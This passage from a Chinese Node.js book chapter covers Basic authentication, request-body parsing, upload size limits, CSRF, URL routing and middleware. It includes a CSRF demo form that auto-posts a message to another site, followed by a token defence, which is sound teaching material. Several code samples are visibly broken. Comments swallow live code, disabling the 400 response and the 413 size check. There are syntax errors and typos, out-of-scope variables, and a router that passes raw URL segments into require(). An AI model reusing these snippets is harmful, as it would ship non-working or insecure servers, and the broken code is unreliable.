- 每次发布，路径中跟随Web应用的版本号：http://url.com/?v=20130501 。
- 每次发布，路径中跟随该文件内容的hash值：http://url.com/?hash=afadfadwe 。

大体来说，根据文件内容的hash值进行缓存淘汰会更加高效，因为文件内容不一定随着Web应用的版本而更新，而内容没有更新时，版本号的改动导致的更新毫无意义，因此以文件内容形成的hash值更精准。

#### Basic认证

Basic认证是当客户端与服务器端进行请求时，允许通过用户名和密码实现的一种身份认证方式。这里简要介绍它的原理和它在服务器端通过Node处理的流程。
如果一个页面需要Basic认证，它会检查请求报文头中的Authorization字段的内容，该字段的值由认证方式和加密值构成，如下所示：

```
$ curl -v "http://user:pass@www.baidu.com/" 
> GET / HTTP/1.1 
> Authorization: Basic dXNlcjpwYXNz 
> User-Agent: curl/7.24.0 (x86_64-apple-darwin12.0) libcurl/7.24.0 OpenSSL/0.9.8r zlib/1.2.5 
> Host: www.baidu.com 
> Accept: */*
```
在Basic认证中，它会将用户和密码部分组合：username + ":" + password。然后进行Base64编码，如下所示：

```js
var encode = function (username, password) { return new Buffer(username + ':' + password).toString('base64'); 
};
```
如果用户首次访问该网页，URL地址中也没携带认证内容，那么浏览器会响应一个401未授权的状态码，如下所示：

```js
function (req, res) { var auth = req.headers['authorization'] || ''; 
var parts = auth.split(' '); var method = parts[0] || ''; // Basic 
var encoded = parts[1] || ''; // dXNlcjpwYXNz var decoded = new Buffer(encoded, 'base64').toString('utf-8').split(":"); 
var user = decoded[0]; // user var pass = decoded[1]; // pass 
if (!checkUser(user, pass)) { res.setHeader('WWW-Authenticate', 'Basic realm="Secure Area"'); 
res.writeHead(401); res.end(); 
} else { handle(req, res); 
} }
```
在上面的代码中，响应头中的WWW-Authenticate字段告知浏览器采用什么样的认证和加密方式。一般而言，未认证的情况下，浏览器会弹出对话框进行交互式提交认证信息，如下图所示。

![浏览器会弹出的交互式提交认证信息对话框](https://graphbed.qiniu.songxingguo.com/Node-Web-App/%E6%B5%8F%E8%A7%88%E5%99%A8%E4%BC%9A%E5%BC%B9%E5%87%BA%E7%9A%84%E4%BA%A4%E4%BA%92%E5%BC%8F%E6%8F%90%E4%BA%A4%E8%AE%A4%E8%AF%81%E4%BF%A1%E6%81%AF%E5%AF%B9%E8%AF%9D%E6%A1%86.jpg)

当认证通过，服务器端响应200状态码之后，浏览器会保存用户名和密码口令，在后续的请求中都携带上Authorization信息。

Basic认证有太多的缺点，它虽然经过Base64加密后在网络中传送，但是这近乎于明文，十分危险，一般只有在HTTPS的情况下才会使用。不过Basic认证的支持范围十分广泛，几乎所有的浏览器都支持它。

为了改进Basic认证，RFC 2069规范提出了摘要访问认证，它加入了服务器端随机数来保护认证过程，在此不做深入的解释。


### 数据上传

上述的内容基本都集中在HTTP请求报文头中，适用于GET请求和大多数其他请求。头部报文中的内容已经能够让服务器端进行大多数业务逻辑操作了，但是单纯的头部报文无法携带大量的数据，在业务中，我们往往需要接收一些数据，比如表单提交、文件提交、JSON上传、XML上传等。

Node的http模块只对HTTP报文的头部进行了解析，然后触发request事件。如果请求中还带有内容部分（如POST请求，它具有报头和内容），内容部分需要用户自行接收和解析。通过报头的Transfer-Encoding或Content-Length即可判断请求中是否带有内容，如下所示：

```js
var hasBody = function(req) {
  return 'transfer-encoding' in req.headers || 'content-length' in req.headers;
};
```
在HTTP_Parser解析报头结束后，报文内容部分会通过data事件触发，我们只需以流的方式处理即可，如下所示：

```js
function(req, res) {
  if (hasBody(req)) {
    var buffers = [];
    req.on('data',
    function(chunk) {
      buffers.push(chunk);
    });
    req.on('end',
    function() {
      req.rawBody = Buffer.concat(buffers).toString();
      handle(req, res);
    });
  } else {
    handle(req, res);
  }
}
```
将接收到的Buffer列表转化为一个Buffer对象后，再转换为没有乱码的字符串，暂时挂置在req.rawBody处。

#### 表单数据

最为常见的数据提交就是通过网页表单提交数据到服务器端，如下所示：

```html
<html>
 <head></head>
 <body>
  <form action="/upload" method="post"> 
   <label for="username">Username:</label> 
   <input type="text" name="username" id="username" /> 
   <br /> 
   <input type="submit" name="submit" value="Submit" /> 
  </form>
 </body>
</html>
```
默认的表单提交，请求头中的Content-Type字段值为application/x-www-form-urlencoded，如下所示：

```
Content-Type: application/x-www-form-urlencoded
```
由于它的报文体内容跟查询字符串相同：

```
foo=bar&baz=val
```
因此解析它十分容易：

```js
var handle = function(req, res) {
  if (req.headers['content-type'] === 'application/x-www-form-urlencoded') {
    req.body = querystring.parse(req.rawBody);
  }
  todo(req, res);
};
```
后续业务中直接访问req.body就可以得到表单中提交的数据。

#### 其他格式

除了表单数据外，常见的提交还有JSON和XML文件等，判断和解析他们的原理都比较相似，都是依据Content-Type中的值决定，其中JSON类型的值为application/json，XML的值为application/xml。

需要注意的是，在Content-Type中可能还附带如下所示的编码信息：

```
Content-Type: application/json; 
charset=utf-8
```
所以在做判断时，需要注意区分，如下所示：

```js
var mime = function(req) {
  var str = req.headers['content-type'] || '';
  return str.split(';')[0];
};
```
1. JSON文件

如果从客户端提交JSON内容，这对于Node来说，要处理它都不需要额外的任何库，如下所示：

```js
var handle = function(req, res) {
  if (mime(req) === 'application/json') {
    try {
      req.body = JSON.parse(req.rawBody);
    } catch(e) {
      // 异常内容，响应Bad request res.writeHead(400); 
      res.end('Invalid JSON');
      return;
    }
  }
  todo(req, res);
};
```
2. XML文件

解析XML文件稍微复杂一点，但是社区有支持XML文件到JSON对象转换的库，这里以xml2js模块为例，如下所示：

```js
var xml2js = require('xml2js');
var handle = function(req, res) {
  if (mime(req) === 'application/xml') {
    xml2js.parseString(req.rawBody,
    function(err, xml) {
      if (err) { // 异常内容，响应Bad request 
        res.writeHead(400);
        res.end('Invalid XML');
        return;
      }
      req.body = xml;
      todo(req, res);
    });
  }
};
```
采用类似的方式，无论客户端提交的数据是什么格式，我们都可以通过这种方式来判断该数据是何种类型，然后采用对应的解析方法解析即可。

#### 附件上传

除了常见的表单和特殊格式的内容提交外，还有一种比较独特的表单。通常的表单，其内容可以通过urlencoded的方式编码内容形成报文体，再发送给服务器端，但是业务场景往往需要用户直接提交文件。在前端HTML代码中，特殊表单与普通表单的差异在于该表单中可以含有file类型的控件，以及需要指定表单属性enctype为multipart/form-data，如下所示：

```html
<html>
 <head></head>
 <body>
  <form action="/upload" method="post" enctype="multipart/form-data"> 
   <label for="username">Username:</label> 
   <input type="text" name="username" id="username" /> 
   <label for="file">Filename:</label> 
   <input type="file" name="file" id="file" /> 
   <br /> 
   <input type="submit" name="submit" value="Submit" /> 
  </form>
 </body>
</html>
```
浏览器在遇到multipart/form-data表单提交时，构造的请求报文与普通表单完全不同。首先它的报头中最为特殊的如下所示：

```
Content-Type: multipart/form-
data; boundary=AaB03x 
Content-Length: 18231
```
它代表本次提交的内容是由多部分构成的，其中boundary=AaB03x指定的是每部分内容的分界符，AaB03x是随机生成的一段字符串，报文体的内容将通过在它前面添加--进行分割，报文结束时在它前后都加上--表示结束。另外，Content-Length的值必须确保是报文体的长度。假设上面的表单选择了一个名为diveintonode.js的文件，并进行提交上传，那么生成的报文如下所示：

```
--AaB03x\r\n 
Content-Disposition: form-data; name="username"\r\n 
\r\n 
Jackson Tian\r\n 
--AaB03x\r\n 
Content-Disposition: form-data; name="file"; filename="diveintonode.js"\r\n 
Content-Type: application/javascript\r\n \r\n 
... contents of diveintonode.js ... --AaB03x--
```
普通的表单控件的报文体如下所示：

```
--AaB03x\r\n 
Content-Disposition: form-data; name="username"\r\n \r\n 
Jackson Tian\r\n
```
文件控件形成的报文如下所示：

```
--AaB03x\r\n 
Content-Disposition: form-data; name="file"; filename="diveintonode.js"\r\n 
Content-Type: application/javascript\r\n \r\n 
... contents of diveintonode.js ...
```
一旦我们知晓报文是如何构成的，那么解析它就变得十分容易。值得注意的一点是，由于是文件上传，那么像普通表单、JSON或XML那样先接收内容再解析的方式将变得不可接受。接收大小未知的数据量时，我们需要十分谨慎，如下所示：

```js
function(req, res) {
  if (hasBody(req)) {
    var done = function() {
      handle(req, res);
    };
    if (mime(req) === 'application/json') {
      parseJSON(req, done);
    } else if (mime(req) === 'application/xml') {
      parseXML(req, done);
    } else if (mime(req) === 'multipart/form-data') {
      parseMultipart(req, done);
    }
  } else {
    handle(req, res);
  }
}
```
这里我们将req这个流对象直接交给对应的解析方法，由解析方法自行处理上传的内容，或接收内容并保存在内存中，或流式处理掉。

这里要介绍到的模块是formidable。它基于流式处理解析报文，将接收到的文件写入到系统的临时文件夹中，并返回对应的路径，如下所示：

```js
var formidable = require('formidable');
function(req, res) {
  if (hasBody(req)) {
    if (mime(req) === 'multipart/form-data') {
      var form = new formidable.IncomingForm();
      form.parse(req,
      function(err, fields, files) {
        req.body = fields;
        req.files = files;
        handle(req, res);
      });
    }
  } else {
    handle(req, res);
  }
}
```
因此在业务逻辑中只要检查req.body和req.files中的内容即可。

#### 数据上传与安全

Node提供了相对底层的API，通过它构建各种各样的Web应用都是相对容易的，但是在Web应用中，不得不重视与数据上传相关的安全问题。由于Node与前端JavaScript的近缘性，前端JavaScript甚至可以上传到服务器直接执行，但在这里我们并不讨论这样危险的动作，而是介绍内存和CSRF相关的安全问题。

1. 内存限制

在解析表单、JSON和XML部分，我们采取的策略是先保存用户提交的所有数据，然后再解析处理，最后才传递给业务逻辑。这种策略存在潜在的问题是，它仅仅适合数据量小的提交请求，一旦数据量过大，将发生内存被占光的情况。攻击者通过客户端能够十分容易地模拟伪造大量数据，如果攻击者每次提交1 MB的内容，那么只要并发请求数量一大，内存就会很快地被吃光。要解决这个问题主要有两个方案。

- 限制上传内容的大小，一旦超过限制，停止接收数据，并响应400状态码。
- 通过流式解析，将数据流导向到磁盘中，Node只保留文件路径等小数据。

流式处理在上文的文件上传中已经有所体现，这里介绍一下Connect中采用的上传数据量的限制方式，如下所示：

```js
var bytes = 1024;
function(req, res) {
  var received = 0,
  var len = req.headers['content-length'] ? parseInt(req.headers['content-length'], 10) : null;
  // 如果内容超过长度限制，返回请求实体过长的状态码 if (len && len > bytes) { 
  res.writeHead(413);
  res.end();
  return;
}
// limit 
req.on('data',
function(chunk) {
  received += chunk.length;
  if (received > bytes) { // 停止接收数据，触发end() 
    req.destroy();
  }
});
handle(req, res);
};
```
从上面的代码中我们可以看到，数据是由包含Content-Length的请求报文判断是否长度超过限制的，超过则直接响应413状态码。对于没有Content-Length的请求报文，略微简略一点，在每个data事件中判定即可。一旦超过限制值，服务器停止接收新的数据片段。如果是JSON文件或XML文件，极有可能无法完成解析。对于上线的Web应用，添加一个上传大小限制十分有利于保护服务器，在遭遇攻击时，能镇定从容应对。

2. CSRF

CSRF的全称是Cross-Site Request Forgery，中文意思为跨站请求伪造。前文提及了服务器端与客户端通过Cookie来标识和认证用户，通常而言，用户通过浏览器访问服务器端的Session ID是无法被第三方知道的，但是CSRF的攻击者并不需要知道Session ID就能让用户中招。

为了详细解释CSRF攻击是怎样一个过程，这里以一个留言的例子来说明。假设某个网站有这样一个留言程序，提交留言的接口如下所示：

```
http://domain_a.com/guestbook
```
用户通过POST提交content字段就能成功留言。服务器端会自动从Session数据中判断是谁提交的数据，补足username和updatedAt两个字段后向数据库中写入数据，如下所示：

```js
function(req, res) {
  var content = req.body.content || '';
  var username = req.session.username;
  var feedback = {
    username: username,
    content: content,
    updatedAt: Date.now()
  };
  db.save(feedback,
  function(err) {
    res.writeHead(200);
    res.end('Ok');
  });
}
```
正常的情况下，谁提交的留言，就会在列表中显示谁的信息。如果某个攻击者发现了这里的接口存在CSRF漏洞，那么他就可以在另一个网站（ http://domain_b.com/attack ）上构造了一个表单提交，如下所示：

```html
<html>
 <head></head>
 <body>
  <form id="test" method="POST" action="http://domain_a.com/guestbook"> 
   <input type="hidden" name="content" value="vim是这个世界上最好的编辑器" /> 
  </form> 
  <script type="text/javascript"> $(function () { 
$("#test").submit(); }); 
</script>
 </body>
</html>
```
这种情况下，攻击者只要引诱某个domain_a的登录用户访问这个domain_b的网站，就会自动提交一个留言。由于在提交到domain_a的过程中，浏览器会将domain_a的Cookie发送到服务器，尽管这个请求是来自domain_b的，但是服务器并不知情，用户也不知情。

以上过程就是一个CSRF攻击的过程。这里的示例仅仅是一个留言的漏洞，如果出现漏洞的是转账的接口，那么其危害程度可想而知。

尽管通过Node接收数据提交十分容易，但是安全问题还是不容忽视。好在CSRF并非不可防御，解决CSRF攻击的方案有添加随机值的方式，如下所示：

```js
var generateRandom = function(len) {
  return crypto.randomBytes(Math.ceil(len * 3 / 4)).toString('base64').slice(0, len);
};
```
也就是说，为每个请求的用户，在Session中赋予一个随机值，如下所示：

```js
var token = req.session._csrf || (req.session._csrf = generateRandom(24));
```
在做页面渲染的过程中，将这个_csrf值告之前端，如下所示：

```html
<html>
 <head></head>
 <body>
  <form id="test" method="POST" action="http://domain_a.com/guestbook"> 
   <input type="hidden" name="content" value="vim是这个世界上最好的编辑器" /> 
   <input type="hidden" name="_csrf" value="&lt;%=_csrf%&gt;" /> 
  </form>
 </body>
</html>
```
由于该值是一个随机值，攻击者构造出相同的随机值的难度相当大，所以我们只需要在接收端做一次校验就能轻易地识别出该请求是否为伪造的，如下所示：

```js
function(req, res) {
  var token = req.session._csrf || (req.session._csrf = generateRandom(24));
  var _csrf = req.body._csrf;
  if (token !== _csrf) {
    res.writeHead(403);
    res.end("禁止访问");
  } else {
    handle(req, res);
  }
}
```
_csrf字段也可以存在于查询字符串或者请求头中。

### 路由解析

前文讲述了许多Web请求过程中的预处理过程，对于不同的业务，我们还是期望有不同的处理方式，这带来了路由的选择问题。

#### 文件路径型

1. 静态文件

这种方式的路由在路径解析的部分有过简单描述，其让人舒服的地方在于URL的路径与网站目录的路径一致，无须转换，非常直观。这种路由的处理方式也十分简单，将请求路径对应的文件发送给客户端即可。这在前文路径解析部分有介绍，不再重复。

2. 动态文件

在MVC模式流行起来之前，根据文件路径执行动态脚本也是基本的路由方式，它的处理原理是Web服务器根据URL路径找到对应的文件，如/index.asp或/index.php。Web服务器根据文件名后缀去寻找脚本的解析器，并传入HTTP请求的上下文。

以下是Apache中配置PHP支持的方式：

```
AddType application/x-httpd-php .php
```
解析器执行脚本，并输出响应报文，达到完成服务的目的。现今大多数的服务器都能很智能地根据后缀同时服务动态和静态文件。这种方式在Node中不太常见，主要原因是文件的后缀都是.js，分不清是后端脚本，还是前端脚本，这可不是什么好的设计。而且Node中Web服务器与应用业务脚本是一体的，无须按这种方式实现。

#### MVC

在MVC流行之前，主流的处理方式都是通过文件路径进行处理的，甚至以为是常态。直到有一天开发者发现用户请求的URL路径原来可以跟具体脚本所在的路径没有任何关系。

MVC模型的主要思想是将业务逻辑按职责分离，主要分为以下几种。

- 控制器（Controller），一组行为的集合。
- 模型（Model），数据相关的操作和封装。
- 视图（View），视图的渲染。

这是目前最为经典的分层模式（如图8-3所示），大致而言，它的工作模式如下说明。

- 路由解析，根据URL寻找到对应的控制器和行为。
- 行为调用相关的模型，进行数据操作。
- 数据操作结束后，调用视图和相关数据进行页面渲染，输出到客户端。

控制器如何调用模型和如何渲染页面，各种实现都大同小异，我们在后续章节中再展开，此处暂且略过。如何根据URL做路由映射，这里有两个分支实现。一种方式是通过手工关联映射，一种是自然关联映射。前者会有一个对应的路由文件来将URL映射到对应的控制器，后者没有这样的文件。

![分层模式](https://graphbed.qiniu.songxingguo.com/Node-Web-App/%E5%88%86%E5%B1%82%E6%A8%A1%E5%BC%8F.jpg)

1. 手工映射

手工映射除了需要手工配置路由外较为原始外，它对URL的要求十分灵活，几乎没有格式上的限制。如下的URL格式都能自由映射：

```
/user/setting 
/setting/user
```
这里假设已经拥有了一个处理设置用户信息的控制器，如下所示：

```js
exports.setting = function (req, res) { 
  // TODO 
};
```
再添加一个映射的方法就行，为了方便后续的行文，这个方法名叫use()，如下所示：

```js
var routes = []; 
var use = function (path, action) { 
  routes.push([path, action]); 
};
```
我们在入口程序中判断URL，然后执行对应的逻辑，于是就完成了基本的路由映射过程，如下所示：

```js
function(req, res) {
  var pathname = url.parse(req.url).pathname;
  for (var i = 0; i < routes.length; i++) {
    var route = routes[i];
    if (pathname === route[0]) {
      var action = route[1];
      action(req, res);
      return;
    }
  }
  // 处理404请求 
  handle404(req, res);
}
```
手工映射十分方便，由于它对URL十分灵活，所以我们可以将两个路径都映射到相同的业务逻辑，如下所示：

```js
use('/user/setting', exports.setting); 
use('/setting/user', exports.setting); 
// 甚至 
use('/setting/user/jacksontian', exports.setting);
```
正则匹配

对于简单的路径，采用上述的硬匹配方式即可，但是如下的路径请求就完全无法满足需求了：

```
/profile/jacksontian 
/profile/hoover
```
这些请求需要根据不同的用户显示不同的内容，这里只有两个用户，假如系统中存在成千上万个用户，我们就不太可能去手工维护所有用户的路由请求，因此正则匹配应运而生，我们期望通过以下的方式就可以匹配到任意用户：

```js
use('/profile/:username', function (req, res) { 
  // TODO 
});
```
于是我们改进我们的匹配方式，在通过use注册路由时需要将路径转换为一个正则表达式，然后通过它来进行匹配，如下所示：

```js
var pathRegexp = function(path) {
  path = path.concat(strict ? '': '/?').replace(/\/\(/g, '(?:/').replace(/(\/)?(\.)?:(\w+)(?:(\(.*?\)))?(\?)?(\*)?/g,
  function(_, slash, format, key, capture, optional, star) {
    slash = slash || '';
    return '' + (optional ? '': slash) + '(?:' + (optional ? slash: '') + (format || '') + (capture || (format && '([^/.]+?)' || '([^/]+?)')) + ')' + (optional || '') + (star ? '(/*)?': '');
  }).replace(/([\/.])/g, '\\$1').replace(/\*/g, '(.*)');
  return new RegExp('^' + path + '$');
}
```
上述正则表达式十分复杂，总体而言，它能实现如下的匹配：

```
/profile/:username => /profile/
jacksontian, /profile/hoover 
/user.:ext => /user.xml, /
user.json
```
现在我们重新改进注册部分：

```js
var use = function (path, action) { 
  routes.push([pathRegexp(path), action]); 
};
```
以及匹配部分：

```js
function(req, res) {
  var pathname = url.parse(req.url).pathname;
  for (var i = 0; i < routes.length; i++) {
    var route = routes[i]; // 正则匹配 
    if (route[0].exec(pathname)) {
      var action = route[1];
      action(req, res);
      return;
    }
  }
  // 处理404请求 
  handle404(req, res);
}
```
现在我们的路由功能就能够实现正则匹配了，无须再为大量的用户进行手工路由映射了。
参数解析尽管完成了正则匹配，可以实现相似URL的匹配，但是:username到底匹配了啥，还没有解决。为此我们还需要进一步将匹配到的内容抽取出来，希望在业务中能如下这样调用：

```js
use('/profile/:username',
function(req, res) {
  var username = req.params.username;
  // TODO 
});
```
这里的目标是将抽取的内容设置到req.params处。那么第一步就是将键值抽取出来，如下所示：

```js
var pathRegexp = function(path) {
  var keys = [];
  path = path.concat(strict ? '': '/?').replace(/\/\(/g, '(?:/').replace(/(\/)?(\.)?:(\w+)(?:(\(.*?\)))?(\?)?(\*)?/g,
  function(_, slash, format, key, capture, optional, star) { // 将匹配到的键值保存起来 
    keys.push(key);
    slash = slash || '';
    return '' + (optional ? '': slash) + '(?:' + (optional ? slash: '') + (format || '') + (capture || (format && '([^/.]+?)' || '([^/]+?)')) + ')' + (optional || '') + (star ? '(/*)?': '');
  }).replace(/([\/.])/g, '\\$1').replace(/\*/g, '(.*)');
  return {
    keys: keys,
    regexp: new RegExp('^' + path + '$')
  };
}
```
我们将根据抽取的键值和实际的URL得到键值匹配到的实际值，并设置到req.params处，如下所示：

```js
function(req, res) {
  var pathname = url.parse(req.url).pathname;
  for (var i = 0; i < routes.length; i++) {
    var route = routes[i];
    // 正则匹配 var reg = route[0].regexp; 
    var keys = route[0].keys;
    var matched = reg.exec(pathname);
    if (matched) { // 抽取具体值 
      var params = {};
      for (var i = 0,
      l = keys.length; i < l; i++) {
        var value = matched[i + 1];
        if (value) {
          params[keys[i]] = value;
        }
      }
      req.params = params;
      var action = route[1];
      action(req, res);
      return;
    }
  }
  // 处理404请求 handle404(req, res); 
}
```
至此，我们除了从查询字符串（req.query）或提交数据（req.body）中取到值外，还能从路径的映射里取到值。

2. 自然映射

手工映射的优点在于路径可以很灵活，但是如果项目较大，路由映射的数量也会很多。从前端路径到具体的控制器文件，需要进行查阅才能定位到实际代码的位置，为此有人提出，尽是路由不如无路由。实际上并非没有路由，而是路由按一种约定的方式自然而然地实现了路由，而无须去维护路由映射。

上文的路径解析部分对这种自然映射的实现有稍许介绍，简单而言，它将如下路径进行了划分处理：

``
/controller/action/param1/param2/param3
```
以/user/setting/12/1987为例，它会按约定去找controllers目录下的user文件，将其require出来后，调用这个文件模块的setting()方法，而其余的值作为参数直接传递给这个方法。

​```js
function(req, res) {
  var pathname = url.parse(req.url).pathname;
  var paths = pathname.split('/');
  var controller = paths[1] || 'index';
  var action = paths[2] || 'index';
  var args = paths.slice(3);
  var module;
  try {
    // require的缓存机制使得只有第一次是阻塞的 
    module = require('./controllers/' + controller);
  } catch(ex) {
    handle500(req, res);
    return;
  }
  var method = module[action]
  if (method) {
    method.apply(null, [req, res].concat(args));
  } else {
    handle500(req, res);
  }
}
```
由于这种自然映射的方式没有指明参数的名称，所以无法采用req.params的方式提取，但是直接通过参数获取更简洁，如下所示：

```js
exports.setting = function(req, res, month, year) { // 如果路径为/user/setting/12/1987，那么month为12，year为1987 
  // TODO 
};
```
事实上手工映射也能将值作为参数进行传递，而不是通过req.params。但是这个观点见仁见智，这里不做比较和讨论。

自然映射这种路由方式在PHP的MVC框架CodeIgniter中应用十分广泛，设计十分简洁，在Node中实现它也十分容易。与手工映射相比，如果URL变动，它的文件也需要发生变动，手工映射只需要改动路由映射即可。

#### RESTful

MVC模式大行其道了很多年，直到RESTful的流行，大家才意识到URL也可以设计得很规范，请求方法也能作为逻辑分发的单元。

REST的全称是Representational State Transfer，中文含义为表现层状态转化。符合REST规范的设计，我们称为RESTful设计。它的设计哲学主要将服务器端提供的内容实体看作一个资源，并表现在URL上。

比如一个用户的地址如下所示：

```
/users/jacksontian
```
这个地址代表了一个资源，对这个资源的操作，主要体现在HTTP请求方法上，不是体现在URL上。过去我们对用户的增删改查或许是如下这样设计URL的：

```
POST /user/add?username=jacksontian 
GET /user/remove?username=jacksontian 
POST /user/update?username=jacksontian 
GET /user/get?username=jacksontian
```
操作行为主要体现在行为上，主要使用的请求方法是POST和GET。在RESTful设计中，它是如下这样的：

```
POST /user/jacksontian 
DELETE /user/jacksontian 
PUT /user/jacksontian 
GET /user/jacksontian
```
它将DELETE和PUT请求方法引入设计中，参与资源的操作和更改资源的状态。

对于这个资源的具体表现形态，也不再如过去一样表现在URL的文件后缀上。过去设计资源的格式与后缀有很大的关联，例如：

```
GET /user/jacksontian.json 
GET /user/jacksontian.xml
```
在RESTful设计中，资源的具体格式由请求报头中的Accept字段和服务器端的支持情况来决定。如果客户端同时接受JSON和XML格式的响应，那么它的Accept字段值是如下这样的：

```
Accept: application/json,application/xml
```
靠谱的服务器端应该要顾及这个字段，然后根据自己能响应的格式做出响应。在响应报文中，通过Content-Type字段告知客户端是什么格式，如下所示：

```
Content-Type: application/json
```
具体格式，我们称之为具体的表现。所以REST的设计就是，通过URL设计资源、请求方法定义资源的操作，通过Accept决定资源的表现形式。

RESTful与MVC设计并不冲突，而且是更好的改进。相比MVC，RESTful只是将HTTP请求方法也加入了路由的过程，以及在URL路径上体现得更资源化。

请求方法

为了让Node能够支持RESTful需求，我们改进了我们的设计。如果use是对所有请求方法的处理，那么在RESTful的场景下，我们需要区分请求方法设计。示例如下所示：

```js
var routes = {
  'all': []
};
var app = {};
app.use = function(path, action) {
  routes.all.push([pathRegexp(path), action]);
}; 
['get', 'put', 'delete', 'post'].forEach(function(method) {
  routes[method] = {};
  app[method] = function(path, action) {
    routes[method].push([pathRegexp(path), action]);
  };
});
```
上面的代码添加了get()、put()、delete()、post()4个方法后，我们希望通过如下的方式完成路由映射：

```
// 增加用户 app.post('/user/:username', addUser); 
// 删除用户 app.delete('/user/:username', removeUser); 
// 修改用户 app.put('/user/:username', updateUser); 
// 查询用户 app.get('/user/:username', getUser);
```
这样的路由能够识别请求方法，并将业务进行分发。为了让分发部分更简洁，我们先将匹配的部分抽取为match()方法，如下所示：

```js
var match = function(pathname, routes) {
  for (var i = 0; i < routes.length; i++) {
    var route = routes[i];
    // 正则匹配
    var reg = route[0].regexp;
    var keys = route[0].keys;
    var matched = reg.exec(pathname);
    if (matched) { // 抽取具体值 
      var params = {};
      for (var i = 0,
      l = keys.length; i < l; i++) {
        var value = matched[i + 1];
        if (value) {
          params[keys[i]] = value;
        }
      }
      req.params = params;
      var action = route[1];
      action(req, res);
      return true;
    }
  }
  return false;
};
```
然后改进我们的分发部分，如下所示：

```js
function(req, res) {
  var pathname = url.parse(req.url).pathname; // 将请求方法变为小写 
  var method = req.method.toLowerCase();
  if (routes.hasOwnPerperty(method)) {
    // 根据请求方法分发 
    if (match(pathname, routes[method])) {
      return;
    } else {
      // 如果路径没有匹配成功，尝试让all()来处理 
      if (match(pathname, routes.all)) {
        return;
      }
    }
  } else { // 直接让all()来处理 
    if (match(pathname, routes.all)) {
      return;
    }
  }
  // 处理404请求 
  handle404(req, res);
}
```
如此，我们完成了实现RESTful支持的必要条件。这里的实现过程采用了手工映射的方法完成，事实上通过自然映射也能完成RESTful的支持，但是根据Controller/Action的约定必须要转化为Resource/Method的约定，此处已经引出实现思路，不再详述。

目前RESTful应用已经开始广泛起来，随着业务逻辑前端化、客户端的多样化，RESTful模式以其轻量的设计，得到广大开发者的青睐。对于多数的应用而言，只需要构建一套RESTful服务接口，就能适应移动端、PC端的各种客户端应用。

### 中间件

片段式地接触完Web应用的基础功能和路由功能后，我们发现从响应Hello World的示例代码到实际的项目，其实有太多琐碎的细节工作要完成，上述内容只是介绍了主要的部分。对于Web应用而言，我们希望不用接触到这么多细节性的处理，为此我们引入中间件（middleware）来简化和隔离这些基础设施与业务逻辑之间的细节，让开发者能够关注在业务的开发上，以达到提升开发效率的目的。

在最早的中间件的定义中，它是一种在操作系统上为应用软件提供服务的计算机软件。它既不是操作系统的一部分，也不是应用软件的一部分，它处于操作系统与应用软件之间，让应用软件更好、更方便地使用底层服务。如今中间件的含义借指了这种封装底层细节，为上层提供更方便服务的意义，并非限定在操作系统层面。这里要提到的中间件，就是为我们封装上文提及的所有HTTP请求细节处理的中间件，开发者可以脱离这部分细节，专注在业务上。

中间件的行为比较类似Java中过滤器（filter）的工作原理，就是在进入具体的业务处理之前，先让过滤器处理。它的工作模型如下图所示。

![中间件工作模型](https://graphbed.qiniu.songxingguo.com/Node-Web-App/%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%9E%8B.jpg)

如同上所示，从HTTP请求到具体业务逻辑之间，其实有很多的细节要处理。Node的http模块提供了应用层协议网络的封装，对具体业务并没有支持，在业务逻辑之下，必须有开发框架对业务提供支持。这里我们通过中间件的形式搭建开发框架，这个开发框架用来组织各个中间件。对于Web应用的各种基础功能，我们通过中间件来完成，每个中间件处理掉相对简单的逻辑，最终汇成强大的基础框架。

由于中间件就是前述的那些基本功能，所以它的上下文也就是请求对象和响应对象：req和res。有一点区别的是，由于Node异步的原因，我们需要提供一种机制，在当前中间件处理完成后，通知下一个中间件执行。在第4章中其实已经对中间件做了介绍，这里我们还是采用Connect的设计，通过尾触发的方式实现。一个基本的中间件会是如下的形式：

```js
var middleware = function (req, res, next) { 
  // TODO 
  next(); 
}
```
按照预期的设计，我们为具体的业务逻辑添加中间件应该是很轻松的事情，通过框架支持，能够将所有的基础功能支持串联起来，如下所示：

```js
app.use('/user/:username', querystring, cookie, session, function (req, res) { 
  // TODO 
});
```
这里的querystring、cookie、session中间件与前文描述的功能大同小异如下所示：

```js
// querystring解析中间件 
var querystring = function(req, res, next) {
  req.query = url.parse(req.url, true).query;
  next();
};
// cookie解析中间件 
var cookie = function(req, res, next) {
  var cookie = req.headers.cookie;
  var cookies = {};
  if (cookie) {
    var list = cookie.split(';');
    for (var i = 0; i < list.length; i++) {
      var pair = list[i].split('=');
      cookies[pair[0].trim()] = pair[1];
    }
  }
  req.cookies = cookies;
  next();
};
```
可以看到这里的中间件都是十分简洁的，接下来我们需要组织起这些中间件。这里我们将路由分离开来，将中间件和具体业务逻辑都看成业务处理单元，改进use()方法如下所示：

```js
app.use = function(path) {
  var handle = {
    // 第一个参数作为路径 
    path: pathRegexp(path),
    // 其他的都是处理单元 
    stack: Array.prototype.slice.call(arguments, 1)
  };
  routes.all.push(handle);
};
```
改进后的use()方法将中间件都存进了stack数组中保存，等待匹配后触发执行。由于结构发生改变，那么我们的匹配部分也需要进行修改，如下所示：

```js
var match = function(pathname, routes) {
  for (var i = 0; i < routes.length; i++) {
    var route = routes[i]; // 正则匹配 
    var reg = route.path.regexp;
    var matched = reg.exec(pathname);
    if (matched) {
      // 抽取具体值 
      // 代码省略 
      // 将中间件数组交给handle()方法处理 
      handle(req, res, route.stack);
      return true;
    }
  }
  return false;
};
``
一旦匹配成功，中间件具体如何调动都交给了handle()方法处理，该方法封装后，递归性地执行数组中的中间件，每个中间件执行完成后，按照约定调用传入next()方法以触发下一个中间件执行（或者直接响应），直到最后的业务逻辑。代码如下所示：

​```js
var handle = function(req, res, stack) {
  var next = function() { // 从stack数组中取出中间件并执行 
    var middleware = stack.shift();
    if (middleware) {
      // 传入next()函数自身，使中间件能够执行结束后递归 
      middleware(req, res, next);
    }
  };
  // 启动执行 
  next();
};
```
这里带来的疑问是，像querystring、cookie、session这样基础的功能中间件是否需要为每个路由都进行设置呢？如果都设置将会演变成如下的路由配置：

```js
app.get('/user/:username', querystring, cookie, session, getUser); 
app.put('/user/:username', querystring, cookie, session, updateUser); 
//更多路由
```
为每个路由都配置中间件并不是一个好的设计，既然中间件和业务逻辑是等价的，那么我们是否可以将路由和中间件进行结合？设计是否可以更人性？既能照顾普适的需求，又能照顾特殊的需求？答案是Yes，如下所示：

```js
app.use(querystring);
app.use(cookie);
app.use(session);
app.get('/user/:username', getUser);
